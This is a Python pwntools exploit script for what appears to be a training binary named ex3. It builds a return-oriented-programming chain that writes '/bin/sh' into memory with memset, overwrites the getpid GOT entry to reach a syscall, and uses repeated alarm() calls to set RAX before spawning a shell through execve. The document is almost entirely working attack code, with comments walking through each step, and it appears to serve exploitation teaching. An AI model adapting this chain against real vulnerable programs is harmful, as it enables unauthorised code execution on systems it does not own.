################################################################################
# ex2-exploit.py
#   Binary: ex3
#   Source: ex3.c
#   Goal:   spawm a shell by calling execve("/bin/sh\x00",NULL,NULL); No
#           leaks of libc6.
################################################################################
from pwn import *

# Binary protections:
# checksec --file ex3
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO            We can overwrite the got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./ex3"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
# 0x00000000004011a5: pop rdi; ret;
# 0x00000000004011a7: pop rsi; ret;
# 0x00000000004011a9: pop rdx; ret;
pop_rdi =   0x04011a5
pop_rsi =   0x04011a7
pop_rdx =   0x04011a9

# We start a local process of the vulnerable program:
r = process(binary.path)

# We need to put "/bin/sh\x00" into rdi. The program calls "memset",
# so we need to write each character at a time into a valid rw-
# section. *mydata seems to be the right place to write to:
cmd_addr    =   binary.symbols["mydata"]
info("We will write /bin/sh into mydata at 0x%02x" % cmd_addr)

# We want to set RAX to 0x3b; we do not have any ROP-gadget to
# achieve that. Notice that we can set RAX to 0 by returning to
# 0x0040116c:
#   0x000000000040116c: mov eax, 0; leave; ret;
#
# Can we re-purpose any called function from libc6?:
#
# [0x403fd0] getpid@GLIBC_2.2.5  →  0x7ffff7e78320
# [0x403fd8] memset@GLIBC_2.2.5  →  0x7ffff7ef5fc0
# [0x403fe0] alarm@GLIBC_2.2.5  →  0x7ffff7e76b60
# [0x403fe8] gets@GLIBC_2.2.5  →  0x7ffff7e19fa0
#
# Yes! alarm(). Because the program sets an alarm to 10 seconds
# we need to disable it first or the program will stop after 10 seconds!
#
# This binary is not PIE; so we can use its addresses right away
# (we don't need a leak)

cmd =   b'/bin/sh\x00'

# We need to put "/bin/sh\x00" into rdi. The program calls "memset",
# so we need to write each character at a time into a valid rw-
# section. *mydata seems to be the right place to write to:
cmd_addr    =   binary.symbols["mydata"]
info("We will write /bin/sh into mydata at 0x%02x" % cmd_addr)

# We can set RDX = 1 just once, so we do it outside the loop:
rop = b''
rop +=  p64(pop_rdx)
rop +=  p64(0x01)                               # rdx <- 0x1
for i in range(0,len(cmd)):
    rop +=  p64(pop_rdi)
    rop +=  p64(cmd_addr+i)                     # rdi <- &mydata[i]
    rop +=  p64(pop_rsi)
    rop +=  p64(cmd[i])                         # rsi <- char
    rop +=  p64(binary.symbols["plt.memset"])   # memset(&mydata[i],cmd[i],1)

# Please notice that we can also use plt.gets(cmd_addr) in order to write
# any string of our choice into cmd_addr. This way, we do not need to iterate
# and the payload will execute faster.

# Now, where to jump to? We now that alarm()+5 has the opcode "syscall"
# Dump of assembler code for function __GI_alarm:
#   0x00007ffff7e76b60 <+0>:	mov    eax,0x25
#   0x00007ffff7e76b65 <+5>:	syscall
# But of course we cannot overwrite got@alarm() because then we couldn't
# call alarm() to set RAX = 0x3b! We need another function:
# getpid:
#   Dump of assembler code for function __GI_getpid:
#   0x00007ffff7febac0 <+0>:	mov    eax,0x27
#   0x00007ffff7febac5 <+5>:	syscall
#   0x00007ffff7febac7 <+7>:	ret
# This value may vary on your local computer due to a different version of
# libc6. You can use gdb or r2 to find out how far apart "syscall" is from
# the start of getpid(). For example, on libc6 2.35 (Ubuntu Jammy), this value
# is 9 instead of 5:
# ┌ 12: int sym.getpid ();
# │           0x000ec040      f30f1efa       endbr64
# │           0x000ec044      b827000000     mov eax, 0x27               ; '\''
# │           0x000ec049      0f05           syscall        getpid()+9
# └           0x000ec04b      c3             ret
# This kind of tricks are discussed in Chapter 2 of the CreativePwning book.
rop +=  p64(pop_rdi)
rop +=  p64(binary.symbols["got.getpid"])
rop +=  p64(pop_rsi)
rop +=  p64(0x25)       # getpid()+5
rop +=  p64(pop_rdx)
rop +=  p64(0x1)        # rdx <- 1
# memset(&got.getpid,0x65,1);
rop +=  p64(binary.symbols["plt.memset"])

# Now we disable alarm() and then we call alarm(0x3b) twice, thus
# setting RAX = 0x3b:
rop     +=  p64(pop_rdi)
rop     +=  p64(0x0)                            # rdi <- 0x0
rop     +=  p64(binary.symbols["plt.alarm"])    # alarm(0);

# Now, the alarm is disabled so we can use alarm() again to set
# the value 0x3b into RAX:
rop     +=  p64(pop_rdi)
rop     +=  p64(0x3b)                           # rdi <- 0x3b
rop     +=  p64(binary.symbols["plt.alarm"])    # alarm(0x3b)
rop     +=  p64(pop_rdi)
rop     +=  p64(0x3b)                           # rdi <- 0x3b
rop     +=  p64(binary.symbols["plt.alarm"])    # alarm(0x3b)

# So, at this point, RAX = 0x3b and the new alarm will trigger
# at exactly 59 seconds. Before the alarm triggers, we need
# to set execve() arguments first:
rop     +=  p64(pop_rdi)
rop     +=  p64(cmd_addr)       # rdi <- &"/bin/sh\x00"
rop     +=  p64(pop_rsi)
rop     +=  p64(0x0)            # char **argp[] = NULL;
rop     +=  p64(pop_rdx)
rop     +=  p64(0x0)            # char **envp[] = NULL;
#   Now, calling getpid@plt() will triger execve():
rop     +=  p64(binary.symbols["plt.getpid"])
r.send(padding + p64(RBP) + rop + b'\x0a')
r.interactive()
r.close()
